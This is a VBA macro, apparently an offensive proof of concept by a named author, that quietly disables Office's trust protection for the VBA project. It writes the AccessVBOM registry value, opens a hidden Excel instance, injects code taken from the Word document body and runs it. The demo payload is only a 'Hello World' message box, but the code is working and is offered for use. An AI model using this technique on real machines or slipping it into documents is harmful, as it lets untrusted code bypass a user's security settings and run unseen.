Sub Execute()
    'Author: Jake Krasnov
    'Twitter: _Hubbl3		
    'This demonstrates disabling the protections against accessing the VBA project and dynamically injecting and running VBA code
    
    
    'Allows trusted access to the VBA project for Excel
    'If errors are being thrown make sure to add a reference to the Microsoft Excel object library and the Visual Basic Extensibility
    Ver = Application.Version
    Set ScriptShell = CreateObject("WScript.Shell")
    'Access VBOM set to 1 allows access to the VBA project
    'This can be done purely in VBA by exporting the win32 apis and is included in the Git Repo
    ScriptShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\" & Ver & "\Excel\Security\AccessVBOM", 1, "REG_DWORD"
    
    'Create the Excel Instance
    Dim objExcel As New Excel.Application
    Dim objBook As Excel.Workbook
    
    
    objExcel.Visible = False 'Visible is False by default but better safe than sorry
    Set objBook = objExcel.Workbooks.Add
    'exposes the VBA proejct
    Set xPro = objBook.VBProject
    Set Module = xPro.VBComponents.Add(vbext_ct_StdModule)
    'For this POC just read the VBA code from the body of the document
    Selection.WholeStory
    subroutine = Selection.Range.Text
    Module.CodeModule.AddFromString (subroutine)
    objExcel.Run ("Module1.HelloWorld")
    objBook.Close SaveChanges:=False
    objExcel.Quit
   
End Sub

Sub HelloWorld()
    'Copy this Subroutine into the body of the Word document
    MsgBox("Hello World!")
End Sub
